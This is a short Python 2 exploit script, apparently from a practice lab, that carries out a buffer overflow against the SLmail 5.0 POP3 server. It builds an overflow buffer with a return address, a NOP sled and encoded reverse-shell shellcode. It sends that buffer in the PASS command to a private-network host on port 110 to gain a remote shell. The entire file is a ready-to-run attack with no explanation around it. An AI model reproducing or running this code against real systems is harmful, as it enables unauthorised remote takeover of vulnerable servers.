#! /usr/bin/python 

# This code is the last steop of BOF attack to SLmail 5.0
# It sends shellcode to the targart to get a reverse shell. 

import socket 


shellcode=("\xbf\x77\x97\xa1\x1f\xdb\xc2\xd9\x74\x24\xf4\x5d\x31\xc9\xb1""\x52\x31\x7d\x12\x03\x7d\x12\x83\x9a\x6b\x43\xea\x98\x7c\x06""\x15\x60\x7d\x67\x9f\x85\x4c\xa7\xfb\xce\xff\x17\x8f\x82\xf3""\xdc\xdd\x36\x87\x91\xc9\x39\x20\x1f\x2c\x74\xb1\x0c\x0c\x17""\x31\x4f\x41\xf7\x08\x80\x94\xf6\x4d\xfd\x55\xaa\x06\x89\xc8""\x5a\x22\xc7\xd0\xd1\x78\xc9\x50\x06\xc8\xe8\x71\x99\x42\xb3""\x51\x18\x86\xcf\xdb\x02\xcb\xea\x92\xb9\x3f\x80\x24\x6b\x0e""\x69\x8a\x52\xbe\x98\xd2\x93\x79\x43\xa1\xed\x79\xfe\xb2\x2a""\x03\x24\x36\xa8\xa3\xaf\xe0\x14\x55\x63\x76\xdf\x59\xc8\xfc""\x87\x7d\xcf\xd1\xbc\x7a\x44\xd4\x12\x0b\x1e\xf3\xb6\x57\xc4""\x9a\xef\x3d\xab\xa3\xef\x9d\x14\x06\x64\x33\x40\x3b\x27\x5c""\xa5\x76\xd7\x9c\xa1\x01\xa4\xae\x6e\xba\x22\x83\xe7\x64\xb5""\xe4\xdd\xd1\x29\x1b\xde\x21\x60\xd8\x8a\x71\x1a\xc9\xb2\x19""\xda\xf6\x66\x8d\x8a\x58\xd9\x6e\x7a\x19\x89\x06\x90\x96\xf6""\x37\x9b\x7c\x9f\xd2\x66\x17\x60\x8a\x50\x8e\x08\xc9\xa0\x54""\x1b\x44\x46\x3e\x8b\x01\xd1\xd7\x32\x08\xa9\x46\xba\x86\xd4""\x49\x30\x25\x29\x07\xb1\x40\x39\xf0\x31\x1f\x63\x57\x4d\xb5""\x0b\x3b\xdc\x52\xcb\x32\xfd\xcc\x9c\x13\x33\x05\x48\x8e\x6a""\xbf\x6e\x53\xea\xf8\x2a\x88\xcf\x07\xb3\x5d\x6b\x2c\xa3\x9b""\x74\x68\x97\x73\x23\x26\x41\x32\x9d\x88\x3b\xec\x72\x43\xab""\x69\xb9\x54\xad\x75\x94\x22\x51\xc7\x41\x73\x6e\xe8\x05\x73""\x17\x14\xb6\x7c\xc2\x9c\xc6\x36\x4e\xb4\x4e\x9f\x1b\x84\x12""\x20\xf6\xcb\x2a\xa3\xf2\xb3\xc8\xbb\x77\xb1\x95\x7b\x64\xcb""\x86\xe9\x8a\x78\xa6\x3b")


buffer = 'A'*2606+'\x8F\x35\x4A\x5F'+"\x90"*16+shellcode 


try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    print "\nSending evil buffer..." 
    s.connect(("192.168.56.109",110)) 
    s.recv(1024) 
    s.send("USER test" + '\r\n') 
    s.recv(1024) 
    s.send('PASS ' + buffer + '\r\n') 
    print"\nDone!."
    print(buffer)
except: print "Could not connect to POP3!"

